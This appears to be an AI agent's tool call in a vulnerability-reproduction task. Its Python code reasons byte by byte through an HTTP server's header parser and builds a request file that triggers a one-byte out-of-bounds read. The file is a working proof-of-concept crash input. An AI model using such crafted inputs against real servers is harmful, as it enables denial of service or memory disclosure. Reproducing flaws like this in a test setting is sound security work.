{"code": "# Let me construct the PoC
# The plan:
# - "GET / HTTP/1.1\r\n" as request line (16 bytes)
# - Then we need headers area from offset 16 to 32766
# - Need \r\n\r\n somewhere in the buffer for read_request_finalizer
# - Need a header pair (start, end) where start is at offset 32764

# parse_headers receives:
#   buffer = data_copy + 15 (the \n after request line \r)
#   buffer_end = data_copy + 32767
# Loop starts at p = buffer + 1 = data_copy + 16

# Strategy:
# - Put one large header from offset 16 to offset 32762 (\r at 32762)
#   This is a single header line of length 32762 - 16 = 32746 chars + \r
# - Offset 32763: \n (completing \r\n)
# - Offset 32764: \r (another \r immediately - this becomes next header start AND end)
# - Offsets 32765-32766: "AB" (non-\r, will cause memchr to return NULL -> goto process)
#
# But wait: after collecting header pair (16, 32762), p = 32762 + 2 = 32764
# Then next_chr = 32764, memchr searches 32767 - 32764 = 3 bytes for \r
# Byte at 32764 is \r, so next_hdr = data_copy + 32764
# buffer_end - next_chr = 32767 - 32764 = 3 (not 2, so we don't skip)
# header_start: (32764, 32764) added. p = 32764 + 2 = 32766
# Next iteration: next_chr = 32766, buffer_end - next_chr = 1
# memchr searches 1 byte for \r. "A" at 32766 is not \r -> NULL -> goto process
#
# Processing:
# header pair (16, 32762): STRING_SWITCH_L(data_copy + 16) reads 4 bytes. Fine.
# header pair (32764, 32764): STRING_SWITCH_L(data_copy + 32764) reads 4 bytes:
#   offsets 32764, 32765, 32766, 32767 -> 32767 is OUT OF BOUNDS!

# But we also need \r\n\r\n in the buffer for read_request_finalizer.
# The sequence at offsets 32762-32765: \r \n \r AB = \r\n\rA - that's not \r\n\r\n.
# Let me adjust: make offset 32765 = \n to get \r\n\r\n at offsets 32762-32765
# Wait: 32762=\r, 32763=\n, 32764=\r, 32765=\n -> that's \r\n\r\n!
# Then offset 32766 can be anything (like 'A')

# But now the memchr from 32766 searches 1 byte (buffer_end - 32766 = 1)
# data_copy[32766] = 'A' -> not \r -> NULL -> goto process. 

# In processing: header (32764, 32764) has start=end=32764 (both point to \r)
# STRING_SWITCH_L(data_copy + 32764) reads 4 bytes: \r, \n, A, ??? (32767 = OOB!)

# Great! And \r\n\r\n at offsets 32762-32765 satisfies the finalizer.
# But wait, there's a subtlety: identify_http_path searches for \r from the URL start.
# It finds the FIRST \r. I need to make sure the first \r it finds is at offset 14.

# Let me double check identify_http_path:
# It calls memchr(buffer, '\r', helper->buffer->len - end_len)
# buffer is the URL start (after "GET "), end_len = buffer - helper->buffer->value
# It finds the first \r from the URL start within the remaining buffer.
# That should be the \r at offset 14 if there's no \r between offsets 4 and 14.

# For the big header chunk (offsets 16 to 32761), I must NOT have any \r in the URL
# part (offsets 4 to 14). "/ HTTP/1.1" has no \r. Good.

# But I also need NO \r in the URL parse area. The request line is:
# "GET / HTTP/1.1\r\n" - correct, \r only at offset 14.

# Now the header area (offsets 16 to 32761) should ideally not have \r 
# (to create one big header chunk). But we already established that the first \r 
# in the headers area is at offset 32762. Offsets 16 to 32761 should be non-\r chars.

# Build the PoC:
data = bytearray(32767)

# Request line: "GET / HTTP/1.1\r\n"
request_line = b"GET / HTTP/1.1\r\n"
data[0:16] = request_line

# Fill offsets 16 to 32761 with 'A' (non-\r)
for i in range(16, 32762):
    data[i] = ord('A')

# Offset 32762: \r
data[32762] = 0x0D  # \r

# Offset 32763: \n
data[32763] = 0x0A  # \n

# Offset 32764: \r
data[32764] = 0x0D  # \r

# Offset 32765: \n (this gives us \r\n\r\n at 32762-32765)
data[32765] = 0x0A  # \n

# Offset 32766: 'A' (non-\r, to ensure memchr returns NULL in last iteration)
data[32766] = ord('A')

# Save the PoC
with open('/workspace/poc.bin', 'wb') as f:
    f.write(data)

print(f"PoC size: {len(data)} bytes")
print(f"Bytes at end: {data[32760:32767].hex()}")
print(f"\\r\\n\\r\\n at offsets 32762-32765: {data[32762:32766] == b'\\r\\n\\r\\n'}")"}
